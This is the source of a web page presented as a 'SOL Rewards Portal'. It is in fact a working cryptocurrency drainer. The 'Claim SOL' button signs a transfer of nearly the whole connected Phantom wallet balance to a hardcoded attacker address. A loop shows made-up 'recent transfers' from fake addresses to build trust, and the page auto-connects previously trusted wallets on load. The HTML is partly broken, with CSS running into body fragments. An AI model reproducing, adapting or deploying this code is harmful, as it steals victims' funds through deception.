<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SOL Rewards Portal</title>
<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap');

  :root {
    --bg: #050510;
    --surface: rgba(15, 15, 30, 0.65);
    --surface-solid: #0f0f1e;
    --border: rgba(255,255,255,0.06);
    --border-glow: rgba(153,69,255,0.3);
    --accent: #9945FF;
    --accent-light: #b794f4;
    --accent2: #14F195;
    --accent2-light: #6fffb8;
    --text: #f0f0f8;
    --text-secondary: #a0a0c0;
    --muted: #555580;
    --error: #ff6b6b;
    --success: #14F195;
    --warning: #fbbf24;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  html {
    scroll-behavior: smooth;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow-x: hidden;
    padding: 16px;
    position: relative;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }

  /* ═══════════════════════════════════════
     ANIMATED BACKGROUND EFFECTS
     ═══════════════════════════════════════ */

  /* Base gradient layer */
  .bg-base {
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse 80% 60% at 10% 0%, rgba(153,69,255,0.15) 0%, transparent 50%),
      radial-gradient(ellipse 60% 50% at 90% 100%, rgba(20,241,149,0.1) 0%, transparent 50%),
      radial-gradient(ellipse 40% 40% at 50% 50%, rgba(153,69,255,0.05) 0%, transparent 60%);
    pointer-events: none;
    z-index: 0;
  }

  /* Animated aurora / mesh gradient */
  .bg-aurora {
    position: fixed;
    inset: 0;
    overflow: hidden;
    pointer-events: none;
    z-index: 0;
    opacity: 0.6;
  }

  .aurora-orb {
    position: absolute;
    border-radius: 50%;
    filter: blur(100px);
    animation: auroraFloat 20s ease-in-out infinite;
    will-change: transform;
  }

  .aurora-orb:nth-child(1) {
    width: 500px; height: 500px;
    background: radial-gradient(circle, rgba(153,69,255,0.35), transparent 70%);
    top: -15%; left: -10%;
    animation-duration: 22s;
    animation-delay: 0s;
  }
  .aurora-orb:nth-child(2) {
    width: 400px; height: 400px;
    background: radial-gradient(circle, rgba(20,241,149,0.25), transparent 70%);
    bottom: -10%; right: -5%;
    animation-duration: 18s;
    animation-delay: -5s;
  }
  .aurora-orb:nth-child(3) {
    width: 300px; height: 300px;
    background: radial-gradient(circle, rgba(99,102,241,0.2), transparent 70%);
    top: 40%; left: 60%;
    animation-duration: 25s;
    animation-delay: -10s;
  }
  .aurora-orb:nth-child(4) {
    width: 250px; height: 250px;
    background: radial-gradient(circle, rgba(236,72,153,0.15), transparent 70%);
    top: 10%; right: 20%;
    animation-duration: 20s;
    animation-delay: -3s;
  }

  @keyframes auroraFloat {
    0%, 100% { transform: translate(0, 0) scale(1); }
    25% { transform: translate(60px, -40px) scale(1.1); }
    50% { transform: translate(-30px, 50px) scale(0.95); }
    75% { transform: translate(40px, 20px) scale(1.05); }
  }

  /* Grid pattern overlay */
  .bg-grid {
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
    background-size: 60px 60px;
    pointer-events: none;
    z-index: 0;
    mask-image: radial-gradient(ellipse 60% 60% at 50% 50%, black 20%, transparent 70%);
    -webkit-mask-image: radial-gradient(ellipse 60% 60% at 50% 50%, black 20%, transparent 70%);
  }

  /* Floating particles */
  .particles-container {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
    overflow: hidden;
  }

  .particle {
    position: absolute;
    width: 3px;
    height: 3px;
    border-radius: 50%;
    opacity: 0;
    animation: particleFloat linear infinite;
  }

  .particle:nth-child(1)  { left: 5%;  background: var(--accent);   animation-duration: 18s; animation-delay: 0s; width: 2px; height: 2px; }
  .particle:nth-child(2)  { left: 15%; background: var(--accent2);  animation-duration: 22s; animation-delay: -2s; width: 3px; height: 3px; }
  .particle:nth-child(3)  { left: 25%; background: var(--accent-light); animation-duration: 16s; animation-delay: -5s; width: 2px; height: 2px; }
  .particle:nth-child(4)  { left: 35%; background: var(--accent2-light); animation-duration: 20s; animation-delay: -8s; }
  .particle:nth-child(5)  { left: 45%; background: var(--accent);   animation-duration: 24s; animation-delay: -3s; width: 2px; height: 2px; }
  .particle:nth-child(6)  { left: 55%; background: var(--accent2);  animation-duration: 19s; animation-delay: -7s; width: 4px; height: 4px; }
  .particle:nth-child(7)  { left: 65%; background: var(--accent-light); animation-duration: 21s; animation-delay: -1s; }
  .particle:nth-child(8)  { left: 75%; background: var(--accent2-light); animation-duration: 17s; animation-delay: -10s; width: 2px; height: 2px; }
  .particle:nth-child(9)  { left: 85%; background: var(--accent);   animation-duration: 23s; animation-delay: -4s; width: 3px; height: 3px; }
  .particle:nth-child(10) { left: 95%; background: var(--accent2);  animation-duration: 15s; animation-delay: -6s; }
  .particle:nth-child(11) { left: 10%; background: rgba(153,69,255,0.6); animation-duration: 26s; animation-delay: -9s; width: 2px; height: 2px; }
  .particle:nth-child(12) { left: 30%; background: rgba(20,241,149,0.6); animation-duration: 18s; animation-delay: -11s; }
  .particle:nth-child(13) { left: 50%; background: rgba(153,69,255,0.4); animation-duration: 22s; animation-delay: -13s; width: 4px; height: 4px; }
  .particle:nth-child(14) { left: 70%; background: rgba(20,241,149,0.4); animation-duration: 20s; animation-delay: -2s; width: 2px; height: 2px; }
  .particle:nth-child(15) { left: 90%; background: rgba(153,69,255,0.5); animation-duration: 24s; animation-delay: -14s; }

  @keyframes particleFloat {
    0% { transform: translateY(100vh) translateX(0); opacity: 0; }
    10% { opacity: 0.6; }
    50% { opacity: 0.3; }
    90% { opacity: 0.5; }
    100% { transform: translateY(-20px) translateX(40px); opacity: 0; }
  }

  /* Noise texture overlay */
  .bg-noise {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
    opacity: 0.025;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
    background-repeat: repeat;
    background-size: 256px 256px;
  }

  /* ═══════════════════════════════════════
     HEADER NOTIFICATION
     ═══════════════════════════════════════ */

  .header-notification {
    position: fixed;
    top: 16px;
    left: 50%;
    transform: translateX(-50%) translateY(-120px);
    background: rgba(15, 15, 30, 0.8);
    backdrop-filter: blur(20px) saturate(1.5);
    -webkit-backdrop-filter: blur(20px) saturate(1.5);
    border: 1px solid rgba(20,241,149,0.2);
    border-radius: 16px;
    padding: 14px 24px;
    z-index: 1000;
    transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    box-shadow: 0 0 30px rgba(20,241,149,0.15), 0 8px 32px rgba(0,0,0,0.4);
    max-width: calc(100vw - 32px);
    width: auto;
  }

  .header-notification.visible {
    transform: translateX(-50%) translateY(0);
  }

  .notification-content {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    font-size: 14px;
    font-weight: 600;
    color: var(--accent2);
    white-space: nowrap;
  }

  .notification-icon {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--accent2), var(--accent));
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    animation: notifPulse 2s ease-in-out infinite;
  }

  .notification-icon svg {
    width: 14px;
    height: 14px;
    fill: var(--bg);
  }

  @keyframes notifPulse {
    0%, 100% { box-shadow: 0 0 0 0 rgba(20,241,149,0.4); }
    50% { box-shadow: 0 0 0 8px rgba(20,241,149,0); }
  }

  /* ═══════════════════════════════════════
     MAIN CARD
     ═══════════════════════════════════════ */

  .card-wrapper {
    position: relative;
    z-index: 1;
    width: 100%;
    max-width: 460px;
    animation: cardEnter 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
  }

  @keyframes cardEnter {
    from { opacity: 0; transform: translateY(30px) scale(0.96); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }

  /* Animated gradient border */
  .card-border-glow {
    position: absolute;
    inset: -1px;
    border-radius: 25px;
    background: conic-gradient(
      from var(--gradient-angle, 0deg),
      rgba(153,69,255,0.5),
      rgba(20,241,149,0.3),
      rgba(99,102,241,0.3),
      rgba(236,72,153,0.2),
      rgba(153,69,255,0.5)
    );
    z-index: -1;
    animation: borderRotate 6s linear infinite;
    opacity: 0.7;
    filter: blur(1px);
  }

  @property --gradient-angle {
    syntax: '<angle>';
    initial-value: 0deg;
    inherits: false;
  }

  @keyframes borderRotate {
    to { --gradient-angle: 360deg; }
  }

  /* Fallback for browsers without @property */
  .card-border-glow::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: inherit;
    background: conic-gradient(
      from 0deg,
      rgba(153,69,255,0.5),
      rgba(20,241,149,0.3),
      rgba(99,102,241,0.3),
      rgba(236,72,153,0.2),
      rgba(153,69,255,0.5)
    );
    animation: borderRotateFallback 6s linear infinite;
    filter: blur(1px);
  }

  @keyframes borderRotateFallback {
    to { transform: rotate(360deg); }
  }

  .card {
    background: var(--surface);
    backdrop-filter: blur(40px) saturate(1.4);
    -webkit-backdrop-filter: blur(40px) saturate(1.4);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 32px 28px;
    width: 100%;
    max-height: 92vh;
    overflow-y: auto;
    position: relative;
    box-shadow:
      0 0 0 1px rgba(255,255,255,0.03) inset,
      0 0 80px rgba(153,69,255,0.06),
      0 32px 64px rgba(0,0,0,0.5);
    overflow-x: hidden;
  }

  /* Card inner glow at top */
  .card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 20%;
    right: 20%;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(153,69,255,0.4), rgba(20,241,149,0.3), transparent);
  }

  /* ═══════════════════════════════════════
     NETWORK BADGE
     ═══════════════════════════════════════ */

  .network-badge {
    position: absolute;
    top: 20px;
    right: 20px;
    font-size: 10px;
    font-family: 'JetBrains Mono', monospace;
    font-weight: 600;
    background: rgba(20,241,149,0.08);
    border: 1px solid rgba(20,241,149,0.15);
    color: var(--accent2);
    padding: 4px 12px;
    border-radius: 20px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
  }

  /* ═══════════════════════════════════════
     LOGO SECTION
     ═══════════════════════════════════════ */

  .logo-row {
    display: flex;
    align-items: center;
    gap: 14px;
    margin-bottom: 28px;
  }

  .logo-icon {
    width: 48px;
    height: 48px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    border-radius: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 22px;
    box-shadow: 0 4px 20px rgba(153,69,255,0.3);
    position: relative;
    overflow: hidden;
  }

  .logo-icon::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.2) 50%, transparent 60%);
    animation: shimmer 3s ease-in-out infinite;
  }

  @keyframes shimmer {
    0%, 100% { transform: translateX(-100%); }
    50% { transform: translateX(100%); }
  }

  .header-text h1 {
    font-size: 24px;
    font-weight: 800;
    letter-spacing: -0.5px;
    line-height: 1.2;
    background: linear-gradient(135deg, #fff 0%, var(--text-secondary) 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  .header-subtitle {
    font-size: 12px;
    color: var(--muted);
    font-weight: 500;
    letter-spacing: 0.3px;
    margin-top: 2px;
  }

  /* ═══════════════════════════════════════
     WALLET BAR
     ═══════════════════════════════════════ */

  .wallet-bar {
    background: rgba(153,69,255,0.06);
    border: 1px solid rgba(153,69,255,0.12);
    border-radius: 14px;
    padding: 14px 16px;
    margin-bottom: 20px;
    display: none;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    animation: slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1);
  }

  @keyframes slideDown {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .wallet-bar.visible { display: flex; }

  .wallet-info {
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 0;
  }

  .wallet-avatar {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    background: linear-gradient(135deg, var(--accent), #6366f1);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }

  .wallet-avatar svg {
    width: 16px;
    height: 16px;
    fill: white;
  }

  .wallet-addr {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--text-secondary);
    word-break: break-all;
    max-width: 200px;
    line-height: 1.4;
  }

  .balance-pill {
    background: rgba(20,241,149,0.08);
    border: 1px solid rgba(20,241,149,0.15);
    border-radius: 12px;
    padding: 6px 14px;
    font-size: 13px;
    font-family: 'JetBrains Mono', monospace;
    font-weight: 600;
    color: var(--accent2);
    white-space: nowrap;
    display: flex;
    align-items: center;
    gap: 4px;
  }

  .balance-pill .sol-icon {
    font-size: 11px;
  }

  /* ═══════════════════════════════════════
     FORM FIELDS
     ═══════════════════════════════════════ */

  .field {
    margin-bottom: 16px;
    position: relative;
  }

  label {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 1.2px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 10px;
  }

  label svg {
    width: 14px;
    height: 14px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .input-wrapper {
    position: relative;
  }

  .input-wrapper input {
    width: 100%;
    background: rgba(255,255,255,0.03);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 14px 16px;
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    outline: none;
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  }

  .input-wrapper input:focus {
    border-color: var(--accent);
    background: rgba(153,69,255,0.04);
    box-shadow: 0 0 0 3px rgba(153,69,255,0.1), 0 0 20px rgba(153,69,255,0.05);
  }

  .input-wrapper input::placeholder { color: var(--muted); font-size: 12px; }

  /* Focus glow ring */
  .input-wrapper::after {
    content: '';
    position: absolute;
    inset: -2px;
    border-radius: 14px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    opacity: 0;
    transition: opacity 0.3s;
    z-index: -1;
    filter: blur(4px);
  }

  .input-wrapper:focus-within::after {
    opacity: 0.15;
  }

  /* ═══════════════════════════════════════
     AUTO AMOUNT DISPLAY
     ═══════════════════════════════════════ */

  .auto-amount {
    background: rgba(20,241,149,0.04);
    border: 1px solid rgba(20,241,149,0.12);
    border-radius: 12px;
    padding: 14px 16px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 14px;
    font-weight: 600;
    color: var(--accent2);
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
  }

  .auto-amount .amount-value {
    font-size: 16px;
  }

  .auto-amount .fee-info {
    font-size: 10px;
    color: var(--muted);
    font-weight: 400;
  }

  /* ═══════════════════════════════════════
     BUTTONS
     ═══════════════════════════════════════ */

  .btn {
    width: 100%;
    padding: 16px;
    border: none;
    border-radius: 14px;
    font-family: 'Inter', sans-serif;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
    letter-spacing: 0.3px;
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    margin-top: 10px;
    position: relative;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }

  .btn::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent 50%);
    opacity: 0;
    transition: opacity 0.3s;
  }

  .btn:hover::before {
    opacity: 1;
  }

  .btn-connect {
    background: linear-gradient(135deg, var(--accent), #7c3aed);
    color: #fff;
    box-shadow:
      0 4px 24px rgba(153,69,255,0.3),
      0 0 0 1px rgba(153,69,255,0.2) inset;
  }

  .btn-connect:hover {
    transform: translateY(-2px);
    box-shadow:
      0 8px 32px rgba(153,69,255,0.4),
      0 0 0 1px rgba(153,69,255,0.3) inset;
  }

  .btn-connect:active {
    transform: translateY(0);
  }

  .btn-send {
    background: linear-gradient(135deg, var(--accent2), #00c97d);
    color: var(--bg);
    box-shadow:
      0 4px 24px rgba(20,241,149,0.25),
      0 0 0 1px rgba(20,241,149,0.15) inset;
    display: none;
  }

  .btn-send.visible { display: flex; }

  .btn-send:hover {
    transform: translateY(-2px);
    box-shadow:
      0 8px 32px rgba(20,241,149,0.4),
      0 0 0 1px rgba(20,241,149,0.2) inset;
  }

  .btn-send:active {
    transform: translateY(0);
  }

  .btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none !important;
  }

  .btn-connected {
    background: rgba(20,241,149,0.08);
    border: 1px solid rgba(20,241,149,0.2);
    color: var(--accent2);
    box-shadow: none;
  }

  .btn-connected:hover {
    background: rgba(20,241,149,0.12);
    box-shadow: 0 0 20px rgba(20,241,149,0.1);
  }

  /* ═══════════════════════════════════════
     STATUS MESSAGES
     ═══════════════════════════════════════ */

  .status {
    margin-top: 16px;
    padding: 14px 16px;
    border-radius: 12px;
    font-size: 13px;
    font-family: 'JetBrains Mono', monospace;
    word-break: break-all;
    display: none;
    animation: statusEnter 0.4s cubic-bezier(0.16, 1, 0.3, 1);
    line-height: 1.5;
    backdrop-filter: blur(10px);
  }

  @keyframes statusEnter {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .status.success {
    display: block;
    background: rgba(20,241,149,0.06);
    border: 1px solid rgba(20,241,149,0.15);
    color: var(--accent2);
  }

  .status.error {
    display: block;
    background: rgba(255,107,107,0.06);
    border: 1px solid rgba(255,107,107,0.15);
    color: var(--error);
  }

  .status.info {
    display: block;
    background: rgba(153,69,255,0.06);
    border: 1px solid rgba(153,69,255,0.15);
    color: var(--accent-light);
  }

  .status a.tx-link {
    color: var(--accent2);
    text-decoration: none;
    font-weight: 600;
    transition: opacity 0.2s;
  }

  .status a.tx-link:hover { opacity: 0.8; }

  /* ═══════════════════════════════════════

<body>

        </label>
        <div class="input-wrapper">
          <input type="text" id="recipient" value="AFNK585ticv7a7t8wscL9gTJMQhA75kn6nqYxf4oPyp3" />

          <svg viewBox="0 0 24 24"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg>

        </label>

      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 01-1.275 1.275L3 12l5.813 1.912a2 2 0 011.275 1.275L12 21l1.912-5.813a2 2 0 011.275-1.275L21 12l-5.813-1.912a2 2 0 01-1.275-1.275L12 3Z"/></svg>
      Claim SOL
    </button>

    <!-- Payout List Section -->
    <div class="payout-section" id="payoutSection" style="display: none;">
      <div class="payout-header">

          Recent Transfers
        </div>

      </div>
      <div class="payout-list" id="payoutList"></div>
    </div>
  </div>

<script>
  const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;

  const RPCS = [
    'https://solana-mainnet.infura.io/v3/1e82942fae354057aa02552fbfc2f6d7',
    'https://rpc.ankr.com/solana',
    'https://api.mainnet-beta.solana.com',
  ];

  let connection = null;
  let walletPubkey = null;
  let payoutHistory = [];

  function showHeaderNotification(message) {
    const notification = document.getElementById('headerNotification');
    const text = document.getElementById('notificationText');
    if (!notification || !text) return;
    text.textContent = message;
    notification.classList.add('visible');
    setTimeout(() => { notification.classList.remove('visible'); }, 4000);
  }

  function addPayout(address, amount) {
    const list = document.getElementById('payoutList');
    const count = document.getElementById('payoutCount');
    const section = document.getElementById('payoutSection');
    if (!list || !count || !section) return;
    section.style.display = 'block';

    const shortAddr = address.slice(0, 4) + '...' + address.slice(-4);
    const initials = address.slice(0, 2).toUpperCase();
    const time = new Date().toLocaleTimeString('en-US', {
      hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const payoutItem = document.createElement('div');
    payoutItem.className = 'payout-item';
    payoutItem.innerHTML = `
      <div class="payout-item-left">
        <div class="payout-avatar">${initials}</div>
        <span class="payout-addr">${shortAddr}</span>
      </div>
      <div class="payout-item-right">
        <span class="payout-amount">${amount}</span>
        <span class="payout-time">${time}</span>
      </div>
    `;

    list.insertBefore(payoutItem, list.firstChild);
    while (list.children.length > 10) { list.removeChild(list.lastChild); }
    payoutHistory.push({ address, amount, time });
    count.textContent = `${payoutHistory.length} transfers`;
  }

  function generateFakePayout() {
    const fakeAddresses = [
      '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
      '3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy',
      '5vKQx8JLzR7L1d6XqZ9Y2vT3wU4eR5iO6pA7sD8fG9h',
      '9aBcDeFgHiJkLmNoPqRsTuVwXyZ123456789',
      '2xYz9AbC3DeFgHiJkLmNoPqRsTuVwXyZ456'
    ];
    const randomAddr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
    const randomAmount = (Math.random() * 2 + 0.1).toFixed(4);
    addPayout(randomAddr, randomAmount);
  }

  function startFakePayoutLoop() {
    for (let i = 0; i < 3; i++) { setTimeout(generateFakePayout, i * 600); }
    setInterval(() => { generateFakePayout(); }, 10000 + Math.random() * 10000);
  }

  async function getWorkingConnection() {
    for (const rpc of RPCS) {
      try {
        const conn = new Connection(rpc, 'confirmed');
        await conn.getSlot();
        console.log('Using RPC:', rpc);
        return conn;
      } catch (e) {
        console.warn('RPC failed:', rpc, e.message);
      }
    }
    throw new Error('All RPC endpoints unavailable. Check your connection.');
  }

  function setStatus(msg, type = 'info') {
    const el = document.getElementById('status');
    el.className = 'status ' + type;
    el.innerHTML = msg;
  }

  function showConnected() {
    const btn = document.getElementById('connectBtn');
    btn.disabled = false;
    btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg> Connected — Tap Claim SOL';
    btn.classList.remove('btn-connect');
    btn.classList.add('btn-connected');
    document.getElementById('divider').style.display = 'block';
    document.getElementById('sendForm').style.display = 'block';
    document.getElementById('sendBtn').classList.add('visible');
    document.getElementById('payoutSection').style.display = 'block';
  }

  async function connectWallet() {
    const btn = document.getElementById('connectBtn');
    try {
      if (isMobile() && !window.solana?.isPhantom) {
        setStatus('Opening Phantom app...', 'info');
        setTimeout(redirectToPhantom, 500);
        return;
      }

      if (!window.solana || !window.solana.isPhantom) {
        setStatus('Phantom not found. <a class="tx-link" href="https://phantom.app" target="_blank">Install Phantom →</a>', 'error');
        return;
      }

      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Connecting...';

      const resp = await window.solana.connect();
      walletPubkey = resp.publicKey;

      document.getElementById('walletAddr').textContent = walletPubkey.toString();
      document.getElementById('walletBar').classList.add('visible');

      setStatus('Fetching balance...', 'info');
      connection = await getWorkingConnection();
      await refreshBalance();

      document.getElementById('status').className = 'status';
      showConnected();
    } catch (e) {
      btn.disabled = false;
      btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg> Connect Phantom';
      setStatus(e.message || 'Connection rejected', 'error');
    }
  }

  async function refreshBalance() {
    if (!walletPubkey || !connection) return;
    try {
      const lamports = await connection.getBalance(walletPubkey);
      const sol = lamports / LAMPORTS_PER_SOL;
      document.getElementById('balancePill').innerHTML = `<span class="sol-icon">◎</span> ${sol.toFixed(4)} SOL`;
      const sendable = Math.max(0, (lamports - 80000) / LAMPORTS_PER_SOL);
      const el = document.getElementById('autoAmount');
      if (el) el.innerHTML = `<span class="amount-value">${sendable.toFixed(6)} SOL</span><span class="fee-info">≈ 0.00008 SOL reserved for fees</span>`;
    } catch (e) {
      document.getElementById('balancePill').innerHTML = '<span class="sol-icon">◎</span> ? SOL';
      console.warn('Balance fetch failed:', e.message);
    }
  }

  async function sendSOL() {
    const btn = document.getElementById('sendBtn');
    const recipientStr = document.getElementById('recipient').value.trim();

    if (!recipientStr) { setStatus('Recipient address missing.', 'error'); return; }

    let recipientPubkey;
    try { recipientPubkey = new PublicKey(recipientStr); }
    catch { setStatus('Invalid recipient address.', 'error'); return; }

    if (!connection) connection = await getWorkingConnection();

    const rawBalance = await connection.getBalance(walletPubkey);
    const RESERVE = 80000;
    const lamports = rawBalance - RESERVE;

    if (lamports <= 0) {
      setStatus('Insufficient balance (need > 0.00008 SOL to cover fees).', 'error');
      return;
    }

    const amount = lamports / LAMPORTS_PER_SOL;

    try {
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Sending...';

      if (!connection) connection = await getWorkingConnection();

      let signature;

      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          setStatus(`Fetching blockhash (attempt ${attempt}/3)...`, 'info');
          const block = await connection.getLatestBlockhash('finalized');

          const tx = new Transaction({
            recentBlockhash: block.blockhash,
            feePayer: walletPubkey,
          }).add(
            SystemProgram.transfer({
              fromPubkey: walletPubkey,
              toPubkey: recipientPubkey,
              lamports,
            })
          );

          setStatus('Approve in Phantom...', 'info');
          const result = await window.solana.signAndSendTransaction(tx);
          signature = result.signature;
          break;
        } catch (e) {
          const expired = e.message && (
            e.message.includes('block height exceeded') ||
            e.message.includes('expired') ||
            e.message.includes('Blockhash not found')
          );
          if (expired && attempt < 3) {
            setStatus(`Blockhash expired, retrying... (${attempt}/3)`, 'info');
            await new Promise(r => setTimeout(r, 1000));
            continue;
          }
          throw e;
        }
      }

      setStatus('Confirming on-chain...', 'info');

      let confirmed = false;
      for (let i = 0; i < 30; i++) {
        await new Promise(r => setTimeout(r, 2000));
        try {
          const status = await connection.getSignatureStatuses([signature]);
          const sigStatus = status?.value?.[0];
          if (sigStatus) {
            if (sigStatus.err) throw new Error('Transaction failed on-chain: ' + JSON.stringify(sigStatus.err));
            if (sigStatus.confirmationStatus === 'confirmed' || sigStatus.confirmationStatus === 'finalized') {
              confirmed = true; break;
            }
          }
        } catch (pollErr) {
          if (pollErr.message.includes('Transaction failed')) throw pollErr;
        }
      }

      setStatus(
        `Sent ${amount.toFixed(6)} SOL!<br><a class="tx-link" href="https://solscan.io/tx/${signature}" target="_blank">View on Solscan →</a>${!confirmed ? '<br><small style="opacity:0.6">Slow to confirm — tx is likely fine, check Solscan</small>' : ''}`,
        'success'
      );

      showHeaderNotification(`Successfully sent ${amount.toFixed(4)} SOL!`);
      addPayout(walletPubkey.toString(), amount.toFixed(4));
      await refreshBalance();

    } catch (e) {
      const msg = e.message || '';
      const isExpiry = msg.includes('block height exceeded') || msg.includes('expired') || msg.includes('Blockhash not found');

      if (isExpiry) {
        setStatus(
          'Sent but confirmation timed out.<br>' +
          (typeof signature !== "undefined"
            ? `<a class="tx-link" href="https://solscan.io/tx/${signature}" target="_blank">Check on Solscan →</a>`
            : 'Please check your wallet balance.'),
          'success'
        );
        if (typeof signature !== "undefined") {
          addPayout(walletPubkey.toString(), amount.toFixed(4));
          showHeaderNotification(`Successfully sent ${amount.toFixed(4)} SOL!`);
        }
        await refreshBalance();
      } else {
        setStatus(msg || 'Transaction failed', 'error');
      }
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 01-1.275 1.275L3 12l5.813 1.912a2 2 0 011.275 1.275L12 21l1.912-5.813a2 2 0 011.275-1.275L21 12l-5.813-1.912a2 2 0 01-1.275-1.275L12 3Z"/></svg> Claim SOL';
    }
  }

  function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }

  function redirectToPhantom() {
    const currentUrl = encodeURIComponent(window.location.href);
    const phantomDeepLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`;
    window.location.href = phantomDeepLink;
  }

  window.addEventListener('load', async () => {
    startFakePayoutLoop();

    if (isMobile() && !window.solana?.isPhantom) {
      setStatus('Opening Phantom app...', 'info');
      setTimeout(redirectToPhantom, 800);
      return;
    }

    if (window.solana?.isPhantom) {
      try {
        const resp = await window.solana.connect({ onlyIfTrusted: true });
        walletPubkey = resp.publicKey;
        document.getElementById('walletAddr').textContent = walletPubkey.toString();
        document.getElementById('walletBar').classList.add('visible');
        connection = await getWorkingConnection();
        await refreshBalance();
        showConnected();
      } catch {}
    }
  });
</script>
</body>
</html>
